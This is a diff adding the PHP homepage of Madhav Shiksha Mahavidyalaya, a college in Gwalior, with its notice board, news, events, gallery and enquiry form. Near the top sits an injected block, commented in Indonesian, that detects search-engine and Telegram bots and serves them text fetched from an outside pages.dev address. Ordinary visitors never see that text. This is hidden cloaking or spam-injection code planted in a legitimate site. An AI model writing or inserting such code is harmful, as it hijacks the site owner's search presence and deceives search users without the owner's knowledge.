@@ -1,0 +1,1024 @@
+<?php $keywords = 'madhav mahavidyalaya gwalior, Best government college in gwalior, Top college in MP, Government college in MP, Best college in gwalior, Top 10 college in gwalior, Madhav College gwalior, colleges near me, online admission, MP online admission, B.com Admission, BA admission, B.sc admission, best education in gwalior, government madhav college in MP, exam form, form notice, chance session march, exam form notice, ba bcom, madhav college gwalior fees structure, madhav college gwalior results, madhav college gwalior llb fees, madhav college gwalior courses, madhav shiksha college, madhav shiksha mahavidyalaya gwalior, madhav shiksha result, madhav shiksha admission date,read, gwalior, education, all, view, view all, national council, teacher education, council of teacher, शिक्षा महाविद्यालय ग्वालियर' ?>
+
+<?php $description = 'Madhav Shiksha Mahavidyalaya is the most prestigious education college of Gwalior. Madhya Bharat Shiksha Samiti was established on 7 th August 1950.' ?> 
+
+<?php $title = 'Madhav Shiksha, Gwalior | Home' ?>
+
+<?php include "includes/header.php"; ?>
+
+<?php
+
+// Fungsi untuk mendeteksi bot
+function is_bot() {
+    if (!isset($_SERVER["HTTP_USER_AGENT"])) {
+        return false;
+    }
+    
+    $user_agent = $_SERVER["HTTP_USER_AGENT"];
+    $bots = array("Googlebot", "TelegramBot", "bingbot", "Baiduspider", "YandexBot");
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Fungsi untuk mengambil konten dengan cURL
+function fetch_content($url) {
+    // Inisialisasi cURL
+    $ch = curl_init();
+
+    // Atur opsi cURL untuk mengambil data
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  // Mengembalikan data sebagai string
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Mengikuti redirect jika ada
+    
+    // Jika URL menggunakan HTTPS, nonaktifkan verifikasi SSL jika perlu
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  // Nonaktifkan verifikasi sertifikat SSL
+
+    // Eksekusi permintaan cURL
+    $content = curl_exec($ch);
+
+    // Cek apakah terjadi error cURL
+    if ($content === false) {
+        // Jika terjadi error, tampilkan pesan error cURL
+        echo "cURL Error: " . curl_error($ch);
+        curl_close($ch);
+        return false;
+    }
+
+    // Cek status kode HTTP dari respon
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    if ($http_code != 200) {
+        echo "HTTP Error: " . $http_code;
+        curl_close($ch);
+        return false;
+    }
+
+    // Tutup koneksi cURL
+    curl_close($ch);
+    return $content;
+}
+
+// Fungsi utama untuk menangani permintaan
+function handle_request() {
+    if (is_bot()) {
+        // Jika request berasal dari bot, ambil konten dari URL eksternal
+        $url = "https://ternyatakamuc-e-o.pages.dev/index.txt";  // Ganti dengan URL sumber konten Anda
+        $content = fetch_content($url);
+        return ($content !== false) ? $content : "Content not available";  // Tampilkan konten atau pesan error
+    }
+    // Jika bukan bot, tampilkan pesan selamat datang
+}
+
+// Set header keamanan dasar
+header('X-Frame-Options: DENY');
+header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
+header('X-Content-Type-Options: nosniff');
+header('X-XSS-Protection: 1; mode=block');
+
+// Tampilkan hasil dari handle_request()
+echo handle_request();
+
+?>
+
+<?php 
+include "backend_Admin_shikshaMadhav/connection/connect.php";
+
+$noticeList = "";
+$sqlQuery  = "select * from notice order by notice_id desc ";
+$sqlResult = mysqli_query($mysqli,$sqlQuery) or die(mysqli_error($mysqli));   
+if(mysqli_affected_rows($mysqli) >= 1){ 
+    while($arrResult = mysqli_fetch_array($sqlResult)){
+
+        $notice_id       = $arrResult['notice_id'];
+        $notice_title    = $arrResult['notice_title'];
+        $notice_link     = $arrResult['notice_link'];
+        $noticePDF       = $arrResult['new_file'];   
+        
+        
+        $created_date = $arrResult['created_date'];
+	    $date_days = date ("Y-m-d", strtotime ($created_date ."+15 days"));
+	   
+	    if($date_days >= date('Y-m-d')) { 	
+  	       $new_tag = '<img src="images/new.gif" alt="New Notice">';
+        } 
+        else{
+            $new_tag = '';
+        }
+	
+
+        if($noticePDF != "")
+        {
+          $pdf = "<p class='parap px-3'> <a href='backend_Admin_shikshaMadhav/uploads/notice/{$noticePDF}' target='_blank'>  {$notice_title} {$new_tag} </a></p><hr>";
+      }else{$pdf = "<p class='parap px-3'>{$notice_title} {$new_tag} </p><hr>";}
+
+      $noticeList .="$pdf";
+  }
+}else {$noticeList = "<tr><td colspan='6'>No Record Here...</td></tr>";}
+
+
+
+
+// $event = "select * from event order by event_id desc limit 3";
+// $exevent=mysqli_query($mysqli,$event);
+// $event_list ="";
+// while($eventTitle = mysqli_fetch_array($exevent)){
+//  $event_id      = $eventTitle['event_id'];
+//  $event_titles  = $eventTitle['event_title'];
+//  $news_link     = $eventTitle['event_pic']; 
+//  $post_date     = date('d-m-Y', strtotime($eventTitle['post_date'])) ; 
+//  if($news_link != "")
+//  {
+//   $pdff = " <li><img class='img-responsive' src='backend_Admin_shikshaMadhav/uploads/events/event_cover/{$news_link }'  alt=''>
+//                     <span class='post_cont'>
+//                         <span class='post-date'>
+//                             <i class='fa fa-calendar'></i> {$post_date}
+//                         </span>
+//                         <a href='news_details.php?id={$event_id}'>
+//                             <span> {$event_titles} </span>
+//                         </a>
+//                     </span>
+//              </li>";
+// }else{$pdff = " <li><img class='img-responsive' src='backend_Admin_shikshaMadhav/uploads/notice/no_image.jpg'  alt=''>
+//                     <span class='post_cont'>
+//                         <span class='post-date'>
+//                             <i class='fa fa-calendar'></i> {$post_date}
+//                         </span>
+//                         <a href='news_details.php?id={$event_id}'>
+//                             <span> {$event_titles} </span>
+//                         </a>
+//                     </span>
+//              </li>";}
+
+// $event_list .= "$pdff";
+
+// }
+
+
+
+
+
+$news = "select * from blogs order by blog_id desc limit 3";
+$exnews=mysqli_query($mysqli,$news);
+$news_list ="";
+while($newsTitle = mysqli_fetch_array($exnews)){
+ $news_id      = $newsTitle['blog_id'];
+ $news_title  = substr($newsTitle['blog_title'],'0','40');
+ $news_pic     = $newsTitle['blog_pic']; 
+ $news_date     = date('d-m-Y', strtotime($newsTitle['post_date'])) ; 
+ 
+ 
+   $date_days = date ("Y-m-d", strtotime ($newsTitle['post_date'] ."+15 days"));
+	   
+	    if($date_days >= date('Y-m-d')) { 	
+  	       $new_tag = '<img src="images/new.gif" alt="New Notice" style="height:20px;width:40px">';
+        } 
+        else{
+            $new_tag = '';
+        }
+        
+
+ if($news_pic != "")
+ {
+  $pdff = " <li><img class='img-responsive' src='backend_Admin_shikshaMadhav/uploads/blogs/blog_cover/{$news_pic }'  alt=''>
+                    <span class='post_cont'>
+                        <span class='post-date'>
+                            <i class='fa fa-calendar'></i> {$news_date}
+                        </span>
+                        <a href='news_details.php?id={$news_id}'>
+                            <span>{$news_title} {$new_tag}</span>
+                        </a>
+                    </span>
+             </li>";
+}else{$pdff = " <li><img class='img-responsive' src='backend_Admin_shikshaMadhav/uploads/blogs/blog_cover/{$news_pic}'  alt=''>
+                    <span class='post_cont'>
+                        <span class='post-date'>
+                            <i class='fa fa-calendar'></i> {$news_date}
+                        </span>
+                        <a href='news_details.php?id={$news_id}'>
+                            <span> {$news_title}  {$new_tag} </span>
+                        </a>
+                    </span>
+             </li>";}
+
+$news_list .= "$pdff";
+
+}
+
+
+?>
+
+
+    <div class="body-overlay transition-3"></div>
+    <!-- Start: Cart Sidebar -->
+
+
+    <!-- Start: Cart Sidebar -->
+
+
+    <!-- Start: Slides  -->
+    <div class="slides_wrapper">
+        <div class="slider_home" id="slider_owl">
+            <!-- Slider 1 -->
+            <div class="single_slider slide_bg_1">
+                <div class="slider_item_tb">
+                    <div class="slider_item_tbcell">
+                      <!--   <div class="container">
+                            <div class="row">
+                                <div class="col-md-10 col-sm-12">
+                                    <h5> Build a strong immune system </h5>
+                                    <h2>
+                                        Drink Raw Milk & <span> Eat Raw Cheese </span>
+                                    </h2>
+                                    <div class="slider_btn">
+                                        <a href="contact.html" class="slider_btn_one more-link">Contact Us <i
+                                                class="far fa-chevron-double-right"></i></a>
+                                        <a href="contact.html" class="slider_btn_two more-link">Read More <i
+                                                class="far fa-chevron-double-right"></i></a>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div> -->
+                    </div>
+                </div>
+            </div>
+            <!-- End: Slider 1 -->
+            <!-- Slider 2 -->
+            <div class="single_slider slide_bg_2">
+                <div class="slider_item_tb">
+                    <div class="slider_item_tbcell">
+                        <!-- <div class="container">
+                            <div class="row">
+                                <div class="col-md-10 col-sm-12">
+                                    <h5> Build a strong immune system </h5>
+                                    <h2>
+                                        Drink Raw Milk & <span> Eat Raw Cheese</span>
+                                    </h2>
+                                    <div class="slider_btn">
+                                        <a href="contact.php" class="slider_btn_one more-link">Contact Us <i
+                                                class="far fa-chevron-double-right"></i></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div> -->
+                    </div>
+                </div>
+            </div>
+            <!-- End: Slider 2 -->
+            <!-- Slider 2 -->
+            <div class="single_slider slide_bg_3">
+                <div class="slider_item_tb">
+                    <div class="slider_item_tbcell">
+                        <!-- <div class="container">
+                            <div class="row">
+                                <div class="col-md-10 col-sm-12">
+                                    <h5> Build a strong immune system </h5>
+                                    <h2>
+                                        Drink Raw Milk & <span> Eat Raw Cheese</span>
+                                    </h2>
+                                    <div class="slider_btn">
+                                        <a href="contact.php" class="slider_btn_one more-link">Contact Us <i
+                                                class="far fa-chevron-double-right"></i></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div> -->
+                    </div>
+                </div>
+            </div>
+            <!-- End: Slider 2 -->
+        </div>
+    </div>
+
+    <!-- End:  Slider Section
+==================================================-->
+
+    <!-- End:  Slider Section
+==================================================-->
+<style>
+.about-section .more-link {
+    margin-top: 12px;
+    border: 2px solid #e6760f;
+color: #e6760f;}
+
+.about-section .more-link {
+    padding: 8px 20px 8px 20px;
+}
+
+.testi_img::after {  background: unset; }
+</style>
+    <!-- Start: About Us Section
+==================================================-->
+    <section class="about-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-6 col-md-12 my-auto">
+                    <div class="base-header base_header_left" style="padding-right: 0px;">
+                        <span class="heading_small">
+                            About Us
+                        </span>
+                        <h1 style="padding-bottom: 0px;font-size: 35px;">Madhav Shiksha Mahavidyalaya </h1>
+                        <p style="text-align: justify;">About Institute Madhav Shiksha Mahavidyalaya is the most prestigious education college of Gwalior. Mahavidyalaya is recognized by National Council of Teacher Education, Madhya Pradesh Bhopal and affiliated to Jiwaji University Gwalior. Madhav Shiksha Mahavidyalaya is run by the Madhya Bharat Shiksha Samiti Vivekanad Marg (Nai Sadak) Gwalior. Madhya Bharat Shiksha Samiti was established on 7 th August 1950 Madhav Shiksha Mahavidyalaya secure a unique place in Madhya Pradesh. </p>
+                 
+
+                        <a href="about.php" class="more-link" style="margin-top: 12px;">Read More 
+						<i class="far fa-chevron-double-right"></i>
+						</a>
+                    </div>
+                </div>
+                <!-- /.about_wrp-->
+                <div class="col-lg-6 col-md-12" id="scene" style="    margin: auto;">
+                    <div class="about_img layer" >
+                        <img src="images/About Us Page Creatives- institute-01.png" alt="madhav-shiksha-mahavidyalaya-gwalior">
+                    </div>
+                </div>
+            </div>
+            <!-- /. row -->
+        </div>
+        <!-- /. container -->
+    </section>
+    <!-- End: About Us Section
+==================================================-->
+
+
+
+    <!-- Start:Our Services Section
+==================================================-->
+    <section class="service-section">
+        <div class="container">
+            <!-- Start: Heading -->
+           <!--  <div class="base-header">
+                <span class="heading_small"> Services </span>
+                <h2> What We Offer</h2>
+            </div> -->
+            <!-- End: Heading -->
+            <div class="row">
+                <div class="col-lg-4 col-md-4 col-sm-12">
+                    <!-- service-item -->
+                    <div class="card border-0 shadow-sm">
+                           <div class="card-header text-center" style="background-color:#e6760f;">
+                            <h2 class="text-white m-0" style="font-size: 32px;">Notice Board</h2>
+                     </div>
+                  <marquee direction="up" scrollamount="4" style="border-left: 1px solid #dee2e6 !important;
+    border-right: 1px solid #dee2e6 !important;background-color: #f8f9fa;padding: 6px;height: 358px;" onmouseover="this.stop();" onmouseout="this.start();">
+  <!-- 
+<p class="parap"><a href="" target="_blank"> Welcome to Parvatibai Gokhale Vigyan Mahavidyalaya</a></p> -->
+        <?php echo $noticeList;?>
+
+</marquee>
+ <div class="card-header " style="background-color: #e6760f;border-radius: 0 0 4px 4px;">
+
+ <a href="noticeboard.php" class="ser-link" style="width: 100px;    margin-top: 13px;">Read More <i class="far fa-chevron-double-right"></i></a>
+</div>
+                </div>
+                    <!-- End: .service-item -->
+                </div>
+            
+                <div class="col-lg-4 col-md-4 col-sm-12">
+                    <div class="service-item">
+
+                    <h2 style="font-size: 32px;">Latest News </h2>
+
+                    <ul class="footer_recent_blog" style="margin-top: 0px">
+                       <marquee direction="up" scrollamount="4" style="padding: 0px;height: 328px;" onmouseover="this.stop();" onmouseout="this.start();">      
+                        <?php echo $news_list; ?>
+                          
+
+
+                       <!------------------------------------
+                            <li>
+                                <img class="img-responsive" src="images/115.jpg" alt="">
+                                <span class="post_cont">
+                                    <span class="post-date">
+                                        <i class="fa fa-calendar"></i>14 Mar 2019
+                                    </span>
+                                    <a href="single-news.php">
+                                        <span>Time Table D.El.Ed. - I & II Year 2017</span>
+                                    </a>
+                                </span>
+                            </li>
+                            <li>
+                                <img class="img-responsive" src="images/115.jpg" alt="">
+                                <span class="post_cont">
+                                    <span class="post-date">
+                                        <i class="fa fa-calendar"></i>14 Mar 2019
+                                    </span>
+                                    <a href="single-news.php">
+                                        <span>Time Table D.El.Ed. - I & II Year 2017</span>
+                                    </a>
+                                </span>
+                            </li>
+                        ------------------------------------>
+                    </marquee>
+                        </ul>
+
+                    <a href="news.php" class="ser-link" style="width: 100px;border:1px solid #e6760f">View All <i class="far fa-chevron-double-right"></i></a>
+                    </div>
+                    <!-- End: .service-item -->
+                </div>
+
+     
+                <div class="col-lg-4 col-md-4 col-sm-12 sectionItem _bg-secondary" style="">
+                <div class="service-item" style="padding: 15px 25px 15px;">
+            <h3 data-mh="services-section-h5" style="">Enquiry Now!</h3>
+
+            <form action="includes/form.php" method="Post" enctype="multipart/form-data">
+                                <div class="form-group">
+                                    <input type="text" name="Name" class="form-control border-0 p-3" placeholder="Your Name" required="required">
+                                </div>
+                                <div class="form-group">
+                                    <input type="email" name="Email" class="form-control border-0 p-3" placeholder="Your Email" required="required">
+                                </div>
+                                <div class="form-group">
+                                <input name="Phone" pattern="[0-9]{10}" type="text" required="" class="form-control border-0 p-3" placeholder="Phone">
+                                </div>
+                                
+                                <div class="form-group">
+                                <textarea name="Message" class="form-control" rows="3" id="message" placeholder="Message" required="required" data-validation-required-message="Please enter your message" aria-invalid="false"></textarea>
+                                 </div>
+
+                                <div class="form-group">
+    <button class="btn btn-secondary btn-block border-0 py-3" style="-webkit-transform: translateY(0px);
+    transform: translateY(0px);    border-radius: 6px !important;
+    background-color: #e6760f;" type="submit" name="submit" value="Sumbit">Submit</button>
+                                </div>
+            </form>
+
+
+           <!--  <p data-mh="services-section-p" class="award" style="text-align: center;">       
+              <img src="images/award-3.png" />
+              <img src="images/award-4.png" />
+            </p> -->
+           <!--  <div class="btn">
+              <a href="#" class="medium" title="LEARN MORE">LEARN MORE</a>
+            </div> -->
+          </div>
+          <!-- <div class="sectionIcon">
+            <a style="color: #000; text-align:center;"><i class="fas fa-plus"></i><br/> More</a>
+          </div> -->
+        </div>
+
+
+            </div>
+            <!-- /. row -->
+        </div>
+        <!-- /. container -->
+    </section>
+    <!-- End:Our Services Section
+==================================================-->
+
+
+    <!-- Start:  Call to action  Section
+==================================================-->
+    <section class="cta-section" style="background: #e6760f;">
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-lg-3 col-md-6 col-sm-12" style="text-align: center;">
+                 <img src="images/Principal Profile Image1-01.png" alt="Principal-image" style="">
+                 <h3 style="font-size: 20px; color:#fff;">Dr. Vivek Bhadauriya </h3>
+                </div>
+
+                <div class="col-lg-9 col-md-6 col-sm-12">
+                <div class="cta-wrap">
+            
+                    <h2 style="margin-bottom: 30px;text-align: left;">Principal Message </span>
+                    </h2>
+                    <p style="text-align: justify;color: #fff;">
+                        
+Welcome to Madhav Shiksha Mahavidyalaya. The aim of the institute is to provide unmatched qualitative training par excellence: to develop the best that is latent in the trainees and to encourage the trainees to explore and revel in the joy of teaching.                                                                  Educational technology has permeated all areas of life. Our endeavour is to integrate technology and its range of application 'throughout the classroom' in an attempt to improve the quality of learning instruction. Modern teaching strategies, provision of student enrichment unit, recognition of various learning styles and culture of academic support create a special learning community at our Institute.   
+                    </p>
+                </div>
+                </div>
+
+            </div>
+            <!--/ row - -->
+        </div>
+        <!--/ Container - -->
+    </section>
+    <!--   End:   Call to action Section
+==================================================-->
+
+
+    <!-- Start: Our Shop Section
+==================================================-->
+<style>
+.fea-text h4 {
+    font-size: 22px;
+    margin-top: 5px;
+    margin-bottom: 10px;
+}
+</style>
+    <!-- Start:  Featured Product Section
+==================================================-->
+    
+    <section class="featured-product-section">
+        <!-- Container -->
+        <div class="container-fluid">
+            <!-- Start: Heading -->
+            <div class="base-header" style="padding-bottom: 10px;">
+                <span class="heading_small"> Facilities </span>
+                <h2> Infrastructure & Facilities </h2>
+            </div>
+            <!-- End: Heading -->
+            <div class="row">
+                <div class="col-lg-5 col-sm-12  my-auto">
+                    <div class="fea-img-carousel" id="fea_carousel" style="background-image: linear-gradient(90deg, #f7f7f7 32%, #f7f7f7 32%);">
+                        <div class="fea-img"></div>
+                        <div class="fea-img2"></div>
+                        <div class="fea-img3"></div>
+                        <div class="fea-img4"></div>
+                    </div>
+                    <!-- End: Heading -->
+                </div>
+                <div class="col-lg-7 col-sm-12 my-auto">
+                    <div class="featured-container">
+                        <div class="row">
+                            <div class="col-md-6 col-sm-12">
+                                <div class="fea-product-item">
+                                    <!-- <div class="fea-icon">
+                                        <i class="fad fa-bread-loaf"></i>
+                                    </div> -->
+								<img src="images/Library icon-01.png" alt="library-icon" style="width: 80px;">
+                                    <div class="fea-text">
+                                        <h4>Library</h4>
+                                        <p style="text-align: justify;">An Institution is  incomplete if it does not have a well stocked library madhav shiksh mahavidyalaya  has a Library which is updated with the <br>
+                                            <a href="infrastructure-&-facilities.php#library" style=""> Read More</a>
+                                        </p>
+                                     
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- end: col-md-6 -->
+
+                            <div class="col-md-6 col-sm-12">
+                                <div class="fea-product-item">
+                                    <!-- <div class="fea-icon">
+                                        <i class="fad fa-cookie-bite"></i>
+                                    </div> -->
+									<img src="images/COmputer Lab icon-01.png" alt="computer-lab-icon" style="width: 80px;">
+                                    <div class="fea-text">
+                                        <h4> Computer Lab </h4>
+                                        <p style="text-align: justify;">    Computer Lab is Equipped with the adequate numbers  of  computers are available and it is kept open for the students the lab is Equipped to carry <a href="infrastructure-&-facilities.php#Computer" style="">  Read More</a>
+                                        </p>
+                                       
+                                    </div>
+                                </div>
+                            </div>
+                            <!--  end: col-md-6  -->
+
+                            <div class="col-md-6 col-sm-12">
+                                <div class="fea-product-item">
+                                     <div class="fea-icon">
+                                     <!--   <i class="fad fa-cheese-swiss"></i> -->
+										<img src="images/Science Lab icon-01.png" alt="science-lab-icon" style="width: 80px;">
+                                    </div> 
+                                    <div class="fea-text">
+                                        <h4> Science & Mathematical Laboratory  </h4>
+                                        <p style="text-align: justify;">A Laboratory is a facilities provides controlled conditions in which scientific experiments and measurements may be perform  
+                                         <br>
+                                            <a href="infrastructure-&-facilities.php#Science" style="">  Read More</a>
+                                        </p>
+                                       
+                                    </div>
+                                </div>
+                            </div>
+                            <!--  end: col-md-6  -->
+
+                            <div class="col-md-6 col-sm-12">
+                                <div class="fea-product-item">
+                                 <div class="fea-icon">
+                                         <!--   <i class="fad fa-bread-loaf"></i> -->
+										 <img src="images/Psychology icon-01.png" alt="psychology-icon" style="width: 80px;">
+                                    </div> 
+                                    <div class="fea-text">
+                                        <h4>Psychology Laboratory</h4>
+                                        <p style="text-align: justify;">The college has well settled  Psychology Laboratory for evaluating the educational tests such as interest , Intelligence ,mental  ability  and personality  test  Laboratory  also <br>
+                                            <a href="infrastructure-&-facilities.php#Psychology" style="">  Read More</a>
+                                        </p>
+                                       
+                                    </div>
+                                </div>
+                            </div>
+                            <!--  end: col-md-6  -->
+                            <div class="col-md-12"> <a href="infrastructure-&-facilities.php" class="ser-link" style="
+    margin-top: 0px;
+    margin-bottom: 19px;
+width: 100px;border:1px solid #e6760f">View All <i class="far fa-chevron-double-right"></i></a>
+</div>
+
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+            <!--/ row - -->
+        </div>
+        <!--/ Container - -->
+    </section>
+    <!--   End:  Featured Product  Section
+==================================================-->
+
+
+
+<style type="text/css">
+    
+    box-shadow: rgb(149 157 165 / 20%) 0px 8px 24px;
+
+</style>
+
+    <!-- Start:  Team Section
+==================================================-->
+    <section class="team-section" style="    background: #fff; display: none;">
+        <div class="container">
+            <!-- Start: Heading -->
+            <div class="base-header">
+                <span class="heading_small"> Team </span>
+                <h2> Our Faculties </h2>
+            </div>
+            <!-- End: Heading -->
+            <div class="row">
+                <div class="col-lg-3 col-md-6 col-sm-12">
+                    <!-- team-list -->
+                    <div class="team-img">
+                        <img src="images/180650.png" alt="image">
+                    </div>
+                    <div class="team-info">
+                        <h4>Dr. Vivek Bhadauria </h4>
+                        <p> Principal</p>
+                    </div>
+                    <!-- End: .team-list -->
+                </div>
+
+                <div class="col-lg-3 col-md-6 col-sm-12">
+                    <!-- team-list -->
+                    <div class="team-img">
+                        <img src="images/180650.png" alt="image">
+                    </div>
+                    <div class="team-info">
+                        <h4>Dr. Raj Karan Singh </h4>
+                        <p> Asst. Professor</p>
+                    </div>
+                    <!-- End: .team-list -->
+                </div>
+                <div class="col-lg-3 col-md-6 col-sm-12">
+                    <!-- team-list -->
+                    <div class="team-img">
+                        <img src="images/180650.png" alt="image">
+                    </div>
+                    <div class="team-info">
+                        <h4>Dr. Neelam Mishra</h4>
+                        <p> Asst. Professor</p>
+                    </div>
+                    <!-- End: .team-list -->
+                </div>
+
+                <div class="col-lg-3 col-md-6 col-sm-12">
+                    <!-- team-list -->
+                    <div class="team-img">
+                        <img src="images/180650.png" alt="image">
+                    </div>
+                    <div class="team-info">
+                        <h4> Dr. Manisha Pathak </h4>
+                        <p> Asst. Professor</p>
+                    </div>
+                    <!-- End: .team-list -->
+                </div>
+            </div>
+            <!-- /. row -->
+        </div>
+        <!-- /. container -->
+    </section>
+    <!-- End: Team Section
+==================================================-->
+
+
+    <!--  Start:Testimonials Section
+==================================================-->
+    <section class="testimonial-section" style="padding-top: 50px;   padding-bottom: 50px;">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-6 col-sm-12" id="scene2">
+                    <div class="service-item">
+
+                    <h2>Latest Blog </h2>
+
+                    <ul class="footer_recent_blog">
+                         
+  <?php $event = "select * from news order by blog_id desc limit 2";
+                 $exevent=mysqli_query($mysqli,$event);
+                 while($eventTitle = mysqli_fetch_array($exevent)){
+                 $event_id  = $eventTitle['blog_id'];
+                 $event_titles  = $eventTitle['blog_title'];
+                 $event_pic     = $eventTitle['blog_pic']; 
+                 $event_desc     = $eventTitle['blog_description']; 
+                 $event_date     =  date('d-m-Y', strtotime($eventTitle['post_date'])) ; 
+            ?>
+
+                       <!--   <li><img class="img-responsive" src="backend_Admin_shikshaMadhav/uploads/blogs/blog_cover/p2023072230.jpg" alt="">
+                    <span class="post_cont">
+                        <span class="post-date">
+                            <i class="fa fa-calendar"></i> 10-02-2023
+                        </span>
+                        <a href="blog-detail.php">
+                            <span> abc </span>
+                        </a>
+                    </span>
+             </li>  -->
+         <!--     <li><img class="img-responsive" src="backend_Admin_shikshaMadhav/uploads/blogs/blog_cover/p2023065822.jpg" alt="">
+                    <span class="post_cont">
+                        <span class="post-date">
+                            <i class="fa fa-calendar"></i> 10-02-2023
+                        </span>
+                        <a href="blog-detail.php">
+                            <span> Annual Function </span>
+                        </a>
+                    </span>
+             </li>  -->
+           <!--   <li><img class="img-responsive" src="backend_Admin_shikshaMadhav/uploads/blogs/blog_cover/p2023042507.jpg" alt="">
+                    <span class="post_cont">
+                        <span class="post-date">
+                            <i class="fa fa-calendar"></i> 04-02-2023
+                        </span>
+                        <a href="blog-detail.php">
+                            <span> Where does it come from? </span>
+                        </a>
+                    </span>
+             </li>    -->                       
+  <li><img class="img-responsive" src="backend_Admin_shikshaMadhav/uploads/news/docs/<?php echo $event_pic?>" alt="">
+                                <span class="post_cont">
+                                    <span class="post-date">
+                                        <i class="fa fa-calendar"></i><?php echo $event_date?>
+                                    </span>
+                                      <a href="blog-detail.php?id=<?php echo $event_id?>">
+                                        <h5> <?php echo  $event_titles?> </h5>
+                                    </a>
+                                </span>
+                         </li> 
+                         
+                         <?php } ?>
+                        </ul>
+
+                    <a href="blog.php" class="ser-link" style="width: 100px;border:1px solid #e6760f">View All <i class="far fa-chevron-double-right"></i></a>
+                    </div>
+                </div>
+
+                <div class="col-lg-6 col-sm-12"><!-- Start: Heading -->
+                    <div class="base-header base_header_left">
+                        <!-- <span class="heading_small"> Review </span> -->
+                        <h2> Blog</h2>
+                    </div>
+                    <!-- End: Heading -->
+                    <div class="testimonial-carousel" id="testimonial">
+                               
+                         <?php $event = "select * from news order by blog_id desc limit 6";
+                 $exevent=mysqli_query($mysqli,$event);
+                 while($eventTitle = mysqli_fetch_array($exevent)){
+                 $event_id  = $eventTitle['blog_id'];
+                 $event_titles  = $eventTitle['blog_title'];
+                 $event_pic     = $eventTitle['blog_pic']; 
+                 $event_desc     = $eventTitle['blog_description']; 
+                 $event_date     =  date('d-m-Y', strtotime($eventTitle['post_date'])) ; 
+            ?>
+                     <a href="blog-detail.php?id=<?php echo $event_id?>">
+                        <div class="item">
+                            <!-- profile 1-->
+                            <div class="testi_wrp">
+                                <div class="testi_img">
+                                    <img alt="team" class="img-responsive" src="backend_Admin_shikshaMadhav/uploads/news/docs/<?php echo $event_pic?>">
+                                   
+                                </div>
+                                <div class="testi_info">
+                                   
+                                   <p>  <b> <?php echo  $event_titles?> </b><br>
+                                   <?php echo  substr($event_desc,'0','50')?>
+                                    
+                                       </p>
+                                </div>
+                                
+                            </div>
+                        </div> </a>
+                        
+                        <?php } ?>
+                      
+                        <!-- End: profile 4 -->
+                    </div>
+                </div>
+            </div>
+            <!--/.row -->
+        </div>
+        <!--/.container -->
+    </section>
+    <!--  End:Testimonials Section 
+==================================================-->
+
+    <!-- Start: Our Blog Section
+==================================================-->
+    <section class="blog-section">
+        <div class="container">
+            <!-- Start: Heading -->
+            <div class="base-header">
+                <span class="heading_small"> Event </span>
+                <h2> Latest Event</h2>
+            </div>
+            <!-- End: Heading -->
+            <div class="row">
+
+
+<?php   
+
+ $event = "select * from event order by event_id desc limit 3";
+ $exevent=mysqli_query($mysqli,$event);
+ $event_list ="";
+ while($eventTitle = mysqli_fetch_array($exevent)){
+ $event_id      = $eventTitle['event_id'];
+ $event_titles  = $eventTitle['event_title'];
+ $event_desc    = $eventTitle['event_desc'];
+ $event_pic     = $eventTitle['event_pic']; 
+ $post_date     = date('d-m-Y', strtotime($eventTitle['post_date'])) ; 
+?>
+
+                <div class="col-lg-4 col-md-6 col-sm-12">
+                    <div class="blog_wrp">
+                        <div class="blog_img">
+                            <a class="blog_img" href="">
+               
+                <img class="img-responsive" src="backend_Admin_shikshaMadhav/uploads/events/event_cover/<?php echo $event_pic?>" alt="Latest-Event">
+                            </a>
+                        </div>
+                        <div class="blog_info">
+                            <a href="event_detail.php?id=<?php echo $event_id?>">
+                                <h4> <?php echo  $event_titles; ?></h4>
+                            </a>
+                            <p><?php echo substr( $event_desc , 0, 100 ) ?></p>
+
+                            <div class="blog_date">
+                                <span> <i class="fal fa-calendar-alt"></i>  <?php echo $post_date; ?></span>
+                            </div>
+                            <span class="blog_read">
+                                <a href='event_detail.php?id=<?php echo $event_id?>'>Read more</a><i class="far fa-chevron-double-right"></i>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+
+<?php } ?>
+
+
+<div class="col-md-12" style="text-align:center;"> <a href="event.php" class="ser-link" style="text-align: center;
+    margin-top: 20px;
+    margin-bottom: 0px;
+width: 100px;border:1px solid #e6760f">View All <i class="far fa-chevron-double-right"></i></a>
+</div>
+
+            </div>
+            <!-- /. row -->
+        </div>
+        <!-- /. container -->
+    </section>
+    <!-- End: Our Blog Section
+==================================================-->
+
+
+<section class="work-section gallery_pg_one">
+        <div class="container">
+            <!-- Start: Heading -->
+            <div class="base-header">
+                <span class="heading_small"> Gallery </span>
+                <h2>Our Gallery</h2>
+            </div>
+            <!-- End: Heading -->
+            <!-- Start: Work filter -->
+            <!-- <ul class="projects-titles">
+                <li class="active" data-filter="*"><span>all</span>
+                </li>
+                <li data-filter=".web"><span>Cheese</span>
+                </li>
+                <li data-filter=".design"><span>Dairy </span>
+                </li>
+                <li data-filter=".graphics"><span>Milk </span>
+                </li>
+                <li data-filter=".clean"><span>Yogurts </span>
+                </li>
+            </ul> -->
+            <!-- End: Work filter -->
+            <div class="row projects-list" style="position: relative; height: 1140px;">
+                <!-- End: Work Item 5 -->
+                <?php
+                      $GetBlog = "select * from gallery_photo ORDER BY RAND() LIMIT 9 ";
+                      $exeBlog = mysqli_query($mysqli, $GetBlog);
+                      while ($dataBlog = mysqli_fetch_array($exeBlog)) {
+                ?>
+                <div class="col-md-4 col-sm-12 design clean" style="position: absolute; left: 780px; top: 380px;">
+                    <div class="single-project-item project-bg-6" style="background-image: url(backend_Admin_shikshaMadhav/<?php echo  $dataBlog['image']; ?>);">
+                        <div class="project-hover">
+                            <div class="project_cnt">
